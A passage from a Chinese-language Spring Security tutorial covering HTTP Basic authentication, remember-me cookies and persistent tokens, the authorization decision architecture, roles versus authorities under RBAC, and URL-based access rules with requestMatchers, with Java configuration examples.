<li><strong>开发和测试</strong>: 在开发阶段快速保护端点，无需编写登录页面。</li>
</ul>
<hr>
<h5 id="2-工作原理"><a href="#2-工作原理" class="headerlink" title="2. 工作原理"></a>2. 工作原理</h5><ol>
<li>客户端首次请求受保护资源。</li>
<li>服务器返回 <code>401 Unauthorized</code> 状态码，并在响应头中包含 <code>WWW-Authenticate: Basic realm=&quot;user realm&quot;</code>。</li>
<li>浏览器或客户端收到此响应后，会弹出一个对话框，要求用户输入用户名和密码。</li>
<li>客户端将 <code>username:password</code> 这个字符串进行 Base64 编码，然后放入后续请求的 <code>Authorization</code> Header 中，格式为 <code>Authorization: Basic &lt;base64-encoded-credentials&gt;</code>。</li>
<li>服务器端的 <code>BasicAuthenticationFilter</code> 拦截到这个 Header，解码凭证并进行认证。</li>
</ol>
<hr>
<h5 id="3-配置"><a href="#3-配置" class="headerlink" title="3. 配置"></a>3. 配置</h5><p>启用 HTTP Basic 认证非常简单：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@Order(1)</span> <span class="comment">// 如果有多个 SecurityFilterChain，用 @Order 指定优先级</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">apiFilterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        .securityMatcher(<span class="string">&quot;/api/**&quot;</span>) <span class="comment">// 此配置仅对 /api/ 开头的请求生效</span></span><br><span class="line">        .authorizeHttpRequests(auth -&gt; auth.anyRequest().authenticated())</span><br><span class="line">        .httpBasic(Customizer.withDefaults()); <span class="comment">// 启用 HTTP Basic</span></span><br><span class="line">        <span class="comment">// 因为是 API，通常是无状态的，所以禁用 CSRF 和 Session</span></span><br><span class="line">        .csrf(csrf -&gt; csrf.disable())</span><br><span class="line">        .sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS));</span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>.httpBasic()</code>: 一行代码即可启用。</li>
<li>对于 API 场景，通常会禁用 CSRF（因为 API 客户端通常不涉及浏览器 Cookie）并设置会话策略为 <code>STATELESS</code>（无状态），这样每次请求都需要携带 <code>Authorization</code> Header。</li>
</ul>
<hr>
<h4 id="2-4-3-“记住我”-Remember-Me-功能"><a href="#2-4-3-“记住我”-Remember-Me-功能" class="headerlink" title="2.4.3 “记住我” (Remember-Me) 功能"></a>2.4.3 “记住我” (Remember-Me) 功能</h4><p>“记住我”功能允许用户在关闭浏览器后，下次访问时仍然保持登录状态，从而提升用户体验。</p>
<h5 id="1-工作原理-基于-Cookie"><a href="#1-工作原理-基于-Cookie" class="headerlink" title="1. 工作原理 (基于 Cookie)"></a>1. 工作原理 (基于 Cookie)</h5><ol>
<li>用户在登录页面勾选“记住我”复选框并成功登录。</li>
<li><code>RememberMeAuthenticationFilter</code> 捕获到这个成功的登录事件。</li>
<li>它会生成一个特殊的 <code>remember-me</code> Cookie，并将其发送给浏览器。这个 Cookie 包含了用户名、过期时间和一个根据私钥（<code>key</code>）、用户名、密码和过期时间计算出的签名。</li>
<li>用户关闭浏览器再重新打开，访问受保护的页面。</li>
<li>此时用户没有 <code>JSESSIONID</code>，未被认证。但 <code>RememberMeAuthenticationFilter</code> 会检查请求中是否存在 <code>remember-me</code> Cookie。</li>
<li>如果存在，它会验证 Cookie 的签名是否有效且未过期。</li>
<li>如果验证通过，它会像正常登录一样，从 <code>UserDetailsService</code> 加载用户信息，创建一个已认证的 <code>Authentication</code> 对象，并将其放入 <code>SecurityContextHolder</code>。</li>
<li>用户被视为已登录，可以访问受保护的资源。</li>
</ol>
<p><strong>安全性注意</strong>：这种方式相对安全，因为 Cookie 中不包含明文密码，且有签名防止篡改。但如果用户的电脑被他人使用，或者 Cookie 被窃取，攻击者仍然可以在过期前冒充用户身份。</p>
<hr>
<h5 id="2-配置"><a href="#2-配置" class="headerlink" title="2. 配置"></a>2. 配置</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        <span class="comment">// ... authorizeHttpRequests 和 formLogin 配置</span></span><br><span class="line">        .rememberMe(rememberMe -&gt; rememberMe</span><br><span class="line">            .key(<span class="string">&quot;a-very-secret-and-long-key-value&quot;</span>) <span class="comment">// 用于生成签名的私钥，必须配置</span></span><br><span class="line">            .tokenValiditySeconds(<span class="number">86400</span> * <span class="number">14</span>) <span class="comment">// Cookie 有效期，单位秒，这里是14天</span></span><br><span class="line">            .rememberMeParameter(<span class="string">&quot;remember-me&quot;</span>) <span class="comment">// 登录表单中复选框的 name 属性 (默认)</span></span><br><span class="line">            .userDetailsService(userDetailsService) <span class="comment">// 必须提供 UserDetailsService</span></span><br><span class="line">        );</span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>.key(&quot;...&quot;)</code>: <strong>必须设置一个复杂的、保密的私钥</strong>。如果泄露，所有用户的 <code>remember-me</code> Cookie 都将面临风险。</p>
</li>
<li><p><code>.tokenValiditySeconds(...)</code>: 设置 Cookie 的有效期。</p>
</li>
<li><p><code>.userDetailsService(...)</code>: “记住我”功能需要通过它来在 Cookie 验证成功后重新加载用户信息。</p>
</li>
<li><p><strong>前端修改</strong>: 别忘了在你的登录表单中添加一个复选框：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;remember-me&quot;</span> <span class="attr">id</span>=<span class="string">&quot;remember-me&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;remember-me&quot;</span>&gt;</span>Remember me<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>进阶：基于数据库的持久化 Token</strong></p>
<p>上述基于 Cookie 的签名方式存在一个风险：只要 Cookie 未过期，它就一直有效，无法被主动撤销（除非用户修改密码）。</p>
<p>一种更安全的方式是使用持久化 Token。<code>PersistentTokenRepository</code> 会将生成的 Token 存储在数据库中。每次用户通过 “记住我” 登录时，都会生成一个新的 Token 来替换旧的，这使得一个 Token 只能被使用一次，大大降低了 Cookie 被盗用的风险。配置方式如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 提供一个 PersistentTokenRepository 的 Bean，例如 JdbcTokenRepositoryImpl</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> PersistentTokenRepository <span class="title function_">persistentTokenRepository</span><span class="params">(DataSource dataSource)</span> &#123;</span><br><span class="line">    <span class="type">JdbcTokenRepositoryImpl</span> <span class="variable">tokenRepository</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcTokenRepositoryImpl</span>();</span><br><span class="line">    tokenRepository.setDataSource(dataSource);</span><br><span class="line">    <span class="comment">// tokenRepository.setCreateTableOnStartup(true); // 首次运行时可以设为 true 自动建表</span></span><br><span class="line">    <span class="keyword">return</span> tokenRepository;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 在 rememberMe 配置中使用它</span></span><br><span class="line">.rememberMe(rememberMe -&gt; rememberMe</span><br><span class="line">    .tokenRepository(persistentTokenRepository(dataSource)) <span class="comment">// 使用基于数据库的 token 仓库</span></span><br><span class="line">    <span class="comment">// .key(...) 仍然需要</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="3-授权（Authorization）"><a href="#3-授权（Authorization）" class="headerlink" title="3. 授权（Authorization）"></a>3. 授权（Authorization）</h2><h3 id="3-1-授权基础：访问控制"><a href="#3-1-授权基础：访问控制" class="headerlink" title="3.1 授权基础：访问控制"></a>3.1 授权基础：访问控制</h3><p>一旦用户通过了<strong>认证 (Authentication)</strong>，确定了他的身份，接下来的每一步操作都需要经过<strong>授权 (Authorization)</strong> 的检验。授权的核心任务是：<strong>根据当前已认证用户的身份，决定他是否有权访问某个特定的资源</strong>。这个资源可以是一个 URL、一个服务方法，甚至是页面上的一个按钮。</p>
<h4 id="3-1-1-授权流程与决策机制"><a href="#3-1-1-授权流程与决策机制" class="headerlink" title="3.1.1 授权流程与决策机制"></a>3.1.1 授权流程与决策机制</h4><p>Spring Security 的授权流程在宏观上可以看作是一个“守门员”模型，它发生在请求真正到达你的业务代码之前。</p>
<h5 id="1-授权流程概览"><a href="#1-授权流程概览" class="headerlink" title="1. 授权流程概览"></a>1. 授权流程概览</h5><pre><code class="highlight mermaid">flowchart TD
    A[已认证的请求] --&gt; B[AuthorizationFilter &lt;br&gt;- 拦截请求 &lt;br&gt;- 提取目标资源信息 &lt;br&gt;- 提取用户认证信息]
    B --&gt; C&#123;&quot;将信息提交给...&quot;&#125;
    C --&gt; D[AuthorizationManager 新] 
    C --&gt; E[AccessDecisionManager 旧]
    E --&gt; F[AccessDecisionVoter 投票者 &lt;br&gt;- 每个 Voter 根据自身逻辑投票 &lt;br&gt;- 结果：ACCESS_GRANTED / &lt;br&gt;ACCESS_DENIED / ABSTAIN]
    F --&gt; G[AccessDecisionManager 旧 &lt;br&gt;- 汇总投票结果 &lt;br&gt;- 根据策略（如「一票通过」&lt;br&gt;「一致同意」） &lt;br&gt;- 做出最终裁决]
    D --&gt; H[做出最终决策 Check]
    G --&gt; H
    H --&gt; I&#123;决策结果&#125;
    I --&gt; J[允许 Allow: 请求继续执行]
    I --&gt; K[拒绝 Deny: &lt;br&gt;抛出 AccessDeniedException]
    K --&gt; L[ExceptionTranslationFilter &lt;br&gt;- 捕获 AccessDeniedException &lt;br&gt;- 调用 AccessDeniedHandler]
    L --&gt; M[返回 403 Forbidden &lt;br&gt;- 或重定向到错误页面]</code></pre>

<hr>
<h5 id="2-核心决策组件"><a href="#2-核心决策组件" class="headerlink" title="2. 核心决策组件"></a>2. 核心决策组件</h5><ul>
<li><strong>拦截器 (Interceptor)</strong>：<ul>
<li>对于 Web 请求，主要是 <code>AuthorizationFilter</code>。</li>
<li>对于方法级别的安全，是基于 AOP 的方法拦截器。</li>
<li><strong>职责</strong>：在操作发生前“拦住”它，并收集进行授权决策所需的所有信息：<ol>
<li><strong><code>Authentication</code> 对象</strong>: 当前用户的身份信息，从 <code>SecurityContextHolder</code> 获取。</li>
<li><strong>安全对象 (Secure Object)</strong>: 正在被访问的目标资源，例如 <code>Request</code> 对象或被调用的 <code>MethodInvocation</code>。</li>
<li><strong>配置属性 (Configuration Attributes)</strong>: 保护该资源所需的权限配置，例如 <code>hasRole(&#39;ADMIN&#39;)</code> 或 <code>@PreAuthorize(&quot;hasAuthority(&#39;user:read&#39;)&quot;)</code>。</li>
</ol>
</li>
</ul>
</li>
<li><strong><code>AuthorizationManager</code> (现代架构)</strong>：<ul>
<li>这是 Spring Security 6.x 之后推荐的、更简洁的授权决策接口。</li>
<li>它只有一个核心方法 <code>check(Supplier&lt;Authentication&gt; authentication, T object)</code>。</li>
<li><strong>职责</strong>：接收认证信息和目标对象，直接做出“允许”或“拒绝”的最终决策。如果拒绝，它会抛出 <code>AccessDeniedException</code>。我们通过 Lambda 表达式配置的 <code>authorizeHttpRequests</code> 内部就是转换成了不同的 <code>AuthorizationManager</code> 实现。</li>
</ul>
</li>
<li><strong><code>AccessDecisionManager</code> 和 <code>AccessDecisionVoter</code> (传统架构)</strong>：<ul>
<li><strong><code>AccessDecisionManager</code> (决策管理器)</strong>：像一个**“议长”**，它不亲自做判断，而是组织一场投票。</li>
<li><strong><code>AccessDecisionVoter</code> (投票者)</strong>：像**“议员”**。每个 <code>Voter</code> 都有自己专长的领域。例如，<code>RoleVoter</code> 只关心角色（<code>ROLE_</code> 前缀的权限），<code>WebExpressionVoter</code> 负责处理 SpEL 表达式。</li>
<li><strong>投票过程</strong>:<ol>
<li><code>AccessDecisionManager</code> 把收集到的信息分发给它管理的所有 <code>AccessDecisionVoter</code>。</li>
<li>每个 <code>Voter</code> 根据自己的逻辑进行投票，结果有三种：<ul>
<li><code>ACCESS_GRANTED</code> (赞成票)</li>
<li><code>ACCESS_DENIED</code> (反对票)</li>
<li><code>ABSTAIN</code> (弃权票，表示这个决策与我无关)</li>
</ul>
</li>
<li><code>AccessDecisionManager</code> 根据预设的<strong>决策策略</strong>来汇总投票结果：<ul>
<li><strong><code>AffirmativeBased</code> (默认)</strong>: <strong>一票赞成就通过</strong>。只要有一个 Voter 投了赞成票，就允许访问（除非有反对票，具体看配置）。</li>
<li><strong><code>ConsensusBased</code></strong>: <strong>少数服从多数</strong>。赞成票多于反对票就通过。</li>
<li><strong><code>UnanimousBased</code></strong>: <strong>一致同意制</strong>。所有 Voter 都必须投赞成票或弃权票，不能有任何反对票。</li>
</ul>
</li>
</ol>
</li>
<li><strong>最终裁决</strong>：如果最终结果是拒绝，<code>AccessDecisionManager</code> 就会抛出 <code>AccessDeniedException</code>。</li>
</ul>
</li>
</ul>
<hr>
<h5 id="3-异常处理"><a href="#3-异常处理" class="headerlink" title="3. 异常处理"></a>3. 异常处理</h5><p>如果授权决策的结果是“拒绝”，流程并不会立即终止。抛出的 <code>AccessDeniedException</code> 会被 <code>ExceptionTranslationFilter</code> 捕获，然后委托给 <code>AccessDeniedHandler</code> 进行处理，最终通常是向用户返回一个 <strong>403 Forbidden</strong> 页面或 JSON 响应。</p>
<hr>
<h4 id="3-1-2-角色-Role-与-权限-Authority-的区别与联系"><a href="#3-1-2-角色-Role-与-权限-Authority-的区别与联系" class="headerlink" title="3.1.2 角色 (Role) 与 权限 (Authority) 的区别与联系"></a>3.1.2 角色 (Role) 与 权限 (Authority) 的区别与联系</h4><p>从<strong>技术实现</strong>上讲，<strong>角色和权限在 Spring Security 内部都被抽象为 <code>GrantedAuthority</code> 对象</strong>。<code>RoleVoter</code> 在判断时，只是简单地检查 <code>GrantedAuthority</code> 的字符串是否以 <code>ROLE_</code> 开头。</p>
<p>然而，从<strong>设计理念</strong>上讲，它们代表了不同的抽象层次：</p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left"><strong>角色 (Role)</strong></th>
<th align="left"><strong>权限 (Authority&#x2F;Permission)</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>概念</strong></td>
<td align="left"><strong>“是什么” (Who you are)</strong>，代表一组职责或身份的集合。</td>
<td align="left"><strong>“能做什么” (What you can do)</strong>，代表一个具体的操作许可。</td>
</tr>
<tr>
<td align="left"><strong>粒度</strong></td>
<td align="left"><strong>粗粒度 (Coarse-grained)</strong></td>
<td align="left"><strong>细粒度 (Fine-grained)</strong></td>
</tr>
<tr>
<td align="left"><strong>例子</strong></td>
<td align="left"><code>ROLE_ADMIN</code> (管理员)<br><code>ROLE_USER</code> (普通用户)<br><code>ROLE_GUEST</code> (访客)</td>
<td align="left"><code>user:create</code> (创建用户)<br><code>user:read</code> (读取用户)<br><code>order:approve</code> (审批订单)</td>
</tr>
<tr>
<td align="left"><strong>关系</strong></td>
<td align="left"><strong>一个角色通常包含多个权限</strong>。</td>
<td align="left"><strong>一个权限是最小的、不可再分的授权单元</strong>。</td>
</tr>
<tr>
<td align="left"><strong>管理</strong></td>
<td align="left">将权限分配给角色，再将角色分配给用户。</td>
<td align="left">直接将权限分配给用户（不推荐，难以维护）。</td>
</tr>
</tbody></table>
<p><strong>联系与最佳实践：基于角色的访问控制 (RBAC - Role-Based Access Control)</strong></p>
<p>这是业界最主流、最推荐的权限设计模型。它的核心思想是：</p>
<ol>
<li><strong>用户 (User) ←→ 角色 (Role)</strong>: 给用户分配一个或多个角色。<ul>
<li>例如：张三是“内容管理员”。</li>
</ul>
</li>
<li><strong>角色 (Role) ←→ 权限 (Permission&#x2F;Authority)</strong>: 给角色分配一组具体的操作权限。<ul>
<li>例如：“内容管理员”这个角色拥有 <code>article:create</code>, <code>article:edit</code>, <code>article:publish</code>, <code>comment:delete</code> 等权限。</li>
</ul>
</li>
</ol>
<p><strong>用户并不直接拥有权限，而是通过拥有角色来间接获得权限。</strong></p>
<p><strong>优点</strong>:</p>
<ul>
<li><strong>简化管理</strong>: 当需要调整权限时，只需修改角色的权限配置，所有拥有该角色的用户的权限就会自动更新。无需逐个修改每个用户的权限。</li>
<li><strong>逻辑清晰</strong>: “管理员能做什么”比“张三、李四、王五…能做什么”要清晰得多，符合业务语义。</li>
<li><strong>最小权限原则</strong>: 可以精确地为每个角色授予其完成工作所必需的最小权限集合。</li>
</ul>
<p><strong>在 Spring Security 中的体现</strong>:</p>
<ul>
<li>使用 <code>.hasRole(&quot;ADMIN&quot;)</code>: 检查用户是否拥有 <code>ROLE_ADMIN</code> 这个 <code>GrantedAuthority</code>。</li>
<li>使用 <code>.hasAuthority(&quot;user:create&quot;)</code>: 检查用户是否拥有 <code>user:create</code> 这个 <code>GrantedAuthority</code>。</li>
</ul>
<p>当你从数据库加载用户的 <code>GrantedAuthority</code> 时，你应该把用户的<strong>角色</strong>（如 <code>ROLE_ADMIN</code>）和该角色所对应的所有<strong>权限</strong>（如 <code>user:create</code>, <code>user:delete</code>）<strong>全部加载进来</strong>，并作为 <code>GrantedAuthority</code> 列表返回。这样，无论是基于角色的粗粒度控制，还是基于权限的细粒度控制，都可以无缝支持。</p>
<hr>
<h3 id="3-2-基于-URL-的请求授权"><a href="#3-2-基于-URL-的请求授权" class="headerlink" title="3.2 基于 URL 的请求授权"></a>3.2 基于 URL 的请求授权</h3><p>基于 URL 的授权是 Web 应用中最基础、最核心的安全控制方式。它通过配置，为不同的 URL 路径（endpoints）设置不同的访问规则。Spring Security 提供了强大而灵活的链式 API 来实现这一点。</p>
<h4 id="3-2-1-使用-http-authorizeHttpRequests-进行配置"><a href="#3-2-1-使用-http-authorizeHttpRequests-进行配置" class="headerlink" title="3.2.1 使用 http.authorizeHttpRequests() 进行配置"></a>3.2.1 使用 <code>http.authorizeHttpRequests()</code> 进行配置</h4><p>在现代的 <code>SecurityFilterChain</code> 配置中, 所有的 URL 授权规则都定义在 <code>.authorizeHttpRequests()</code> 这个 Lambda 表达式内部。</p>
<p>这个方法提供了一个 <code>AuthorizeHttpRequestsConfigurer</code> 对象（通常我们命名为 <code>auth</code> 或 <code>authorize</code>），我们可以用它来链式地定义一条条匹配规则。</p>
<p><strong>基本结构</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        .authorizeHttpRequests(authorize -&gt; authorize</span><br><span class="line">            <span class="comment">// 在这里定义一条条的 URL 匹配规则</span></span><br><span class="line">            .requestMatchers(<span class="string">&quot;/public/**&quot;</span>, <span class="string">&quot;/login&quot;</span>).permitAll()</span><br><span class="line">            .requestMatchers(<span class="string">&quot;/admin/**&quot;</span>).hasRole(<span class="string">&quot;ADMIN&quot;</span>)</span><br><span class="line">            .anyRequest().authenticated()</span><br><span class="line">        )</span><br><span class="line">        <span class="comment">// ... 其他配置, 如 .formLogin()</span></span><br><span class="line">    ;</span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>重要原则：规则的顺序至关重要 (Order Matters!)</strong></p>
<p>Spring Security 会<strong>从上到下</strong>依次匹配这些规则。一旦一个 URL 被<strong>第一条</strong>适用的规则匹配上，后续的规则就不会再生效。</p>
<p>因此，<strong>必须将更具体的规则放在更通用的规则之前</strong>。</p>
<p><strong>正确顺序示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.authorizeHttpRequests(authorize -&gt; authorize</span><br><span class="line">    .requestMatchers(<span class="string">&quot;/admin/specific-task&quot;</span>).hasRole(<span class="string">&quot;SUPER_ADMIN&quot;</span>) <span class="comment">// 1. 最具体的</span></span><br><span class="line">    .requestMatchers(<span class="string">&quot;/admin/**&quot;</span>).hasRole(<span class="string">&quot;ADMIN&quot;</span>)            <span class="comment">// 2. 较通用的</span></span><br><span class="line">    .anyRequest().authenticated()                             <span class="comment">// 3. 最通用的（必须放最后）</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如果把 <code>/admin/**</code> 放在前面，那么 <code>/admin/specific-task</code> 这个请求会先被 <code>.hasRole(&quot;ADMIN&quot;)</code> 匹配到，从而导致 <code>.hasRole(&quot;SUPER_ADMIN&quot;)</code> 这条更严格的规则永远不会被触发。</p>
<hr>
<h4 id="3-2-2-requestMatchers-的使用"><a href="#3-2-2-requestMatchers-的使用" class="headerlink" title="3.2.2 requestMatchers() 的使用"></a><strong>3.2.2 <code>requestMatchers()</code> 的使用</strong></h4><p><code>requestMatchers()</code> 是定义 URL 模式的入口，它支持多种匹配策略。</p>
<h5 id="1-Ant-风格路径匹配-Ant-style-Path-Matching"><a href="#1-Ant-风格路径匹配-Ant-style-Path-Matching" class="headerlink" title="1. Ant 风格路径匹配 (Ant-style Path Matching)"></a>1. Ant 风格路径匹配 (Ant-style Path Matching)</h5><p>这是最常用、最直观的匹配方式。</p>
<ul>
<li><code>?</code>: 匹配任意单个字符。<ul>
<li><code>&quot;/api/v?&quot;</code> 匹配 <code>/api/v1</code>, <code>/api/v2</code>，但不匹配 <code>/api/v</code> 或 <code>/api/v12</code>。</li>
</ul>
</li>
<li><code>*</code>: 匹配路径中任意数量的字符（不含 <code>/</code>）。<ul>
<li><code>&quot;/users/*&quot;</code> 匹配 <code>/users/123</code>, <code>/users/profile</code>，但不匹配 <code>/users/123/orders</code>。</li>
</ul>
</li>
<li><code>**</code>: 匹配路径中任意数量的目录（包含 <code>/</code>）。<ul>
<li><code>&quot;/admin/**&quot;</code> 匹配 <code>/admin/</code>, <code>/admin/users</code>, <code>/admin/users/1/edit</code> 等所有以 <code>/admin/</code> 开头的路径。</li>
</ul>
</li>
</ul>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 匹配多个具体的路径</span></span><br><span class="line">.requestMatchers(<span class="string">&quot;/home&quot;</span>, <span class="string">&quot;/about&quot;</span>, <span class="string">&quot;/contact&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配某个目录下的所有直接子路径</span></span><br><span class="line">.requestMatchers(<span class="string">&quot;/products/*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配某个目录及其所有子目录下的所有路径</span></span><br><span class="line">.requestMatchers(<span class="string">&quot;/static/css/**&quot;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-匹配-HTTP-方法"><a href="#2-匹配-HTTP-方法" class="headerlink" title="2. 匹配 HTTP 方法"></a>2. 匹配 HTTP 方法</h5><p>你可以在 <code>requestMatchers</code> 中指定 HTTP 方法，从而对同一个 URL 的不同操作（GET, POST, DELETE 等）设置不同的权限。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.HttpMethod.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">.authorizeHttpRequests(authorize -&gt; authorize</span><br><span class="line">    <span class="comment">// 任何人都可以 GET 用户列表</span></span><br><span class="line">    .requestMatchers(GET, <span class="string">&quot;/api/users&quot;</span>).permitAll()</span><br><span class="line">    <span class="comment">// 只有 ADMIN 可以 POST 创建新用户</span></span><br><span class="line">    .requestMatchers(POST, <span class="string">&quot;/api/users&quot;</span>).hasRole(<span class="string">&quot;ADMIN&quot;</span>)</span><br><span class="line">    <span class="comment">// 只有 ADMIN 可以删除特定用户</span></span><br><span class="line">    .requestMatchers(DELETE, <span class="string">&quot;/api/users/&#123;id&#125;&quot;</span>).hasRole(<span class="string">&quot;ADMIN&quot;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="3-Servlet-路径匹配-MVC-匹配"><a href="#3-Servlet-路径匹配-MVC-匹配" class="headerlink" title="3. Servlet 路径匹配 (MVC 匹配)"></a>3. Servlet 路径匹配 (MVC 匹配)</h5><p>Spring Security 6.1+ 默认使用 <code>Spring MVC</code> 的路径匹配规则 (<code>PathPatternParser</code>)，它性能更好，且语法与 Ant 风格基本兼容，但在 <code>**</code> 的使用上略有不同（例如 <code>**</code> 只能在路径末尾）。通常你不需要关心这个区别，除非遇到非常复杂的路径匹配场景。</p>
<hr>
<h4 id="3-2-3-核心访问控制方法"><a href="#3-2-3-核心访问控制方法" class="headerlink" title="3.2.3 核心访问控制方法"></a>3.2.3 核心访问控制方法</h4><p>这些方法跟在 <code>requestMatchers(...)</code> 后面，用于定义匹配到的 URL 需要满足什么条件才能访问。</p>
<ul>
<li><strong><code>permitAll()</code></strong>: <strong>允许所有访问</strong><ul>
<li>允许任何人（包括匿名用户）访问。</li>
<li>常用于公共资源，如登录页、注册页、静态文件 (CSS, JS)、首页等。</li>
<li><strong>示例</strong>: <code>.requestMatchers(&quot;/login&quot;, &quot;/css/**&quot;).permitAll()</code></li>
</ul>
</li>
<li><strong><code>denyAll()</code></strong>: <strong>拒绝所有访问</strong><ul>
<li>无论用户是谁，都无法访问。</li>
<li>不常用，但可用于明确禁用某些不应被外部访问的路径。</li>
<li><strong>示例</strong>: <code>.requestMatchers(&quot;/internal/secret-api&quot;).denyAll()</code></li>
</ul>
</li>
<li><strong><code>authenticated()</code></strong>: <strong>要求已认证</strong><ul>
<li>要求用户必须已经登录（通过了认证）。</li>
<li>这是最基础的保护，不关心用户具体有什么角色或权限，只要登录了就行。</li>
<li><strong>示例</strong>: <code>.requestMatchers(&quot;/my-account/**&quot;).authenticated()</code></li>
</ul>
</li>
</ul>
<hr>
<h4 id="3-2-4-基于角色-权限的访问控制方法"><a href="#3-2-4-基于角色-权限的访问控制方法" class="headerlink" title="3.2.4 基于角色&#x2F;权限的访问控制方法"></a>3.2.4 基于角色&#x2F;权限的访问控制方法</h4><p>这些方法提供了更细粒度的控制，要求用户不仅要登录，还必须拥有特定的角色或权限。</p>
<ul>
<li><strong><code>hasRole(String role)</code></strong>: <strong>要求拥有单个角色</strong><ul>
<li>检查当前用户的 <code>GrantedAuthority</code> 列表中，是否存在一个以 <code>ROLE_</code> 开头的、与指定角色名匹配的权限。</li>
<li><strong>注意</strong>: 你提供的角色名<strong>不需要</strong>加 <code>ROLE_</code> 前缀，框架会自动添加。例如，<code>.hasRole(&quot;ADMIN&quot;)</code> 会去匹配 <code>ROLE_ADMIN</code>。</li>
<li><strong>示例</strong>: <code>.requestMatchers(&quot;/admin/panel&quot;).hasRole(&quot;ADMIN&quot;)</code></li>
</ul>
</li>
<li><strong><code>hasAnyRole(String... roles)</code></strong>: <strong>要求拥有多个角色中的任意一个</strong><ul>
<li>只要用户拥有参数列表中任何一个角色，即可访问。</li>
<li><strong>示例</strong>: <code>.requestMatchers(&quot;/management/**&quot;).hasAnyRole(&quot;ADMIN&quot;, &quot;MANAGER&quot;)</code><ul>
<li>用户有 <code>ROLE_ADMIN</code> 或 <code>ROLE_MANAGER</code> (或两者都有) 就可以访问。</li>
</ul>
</li>
</ul>
</li>
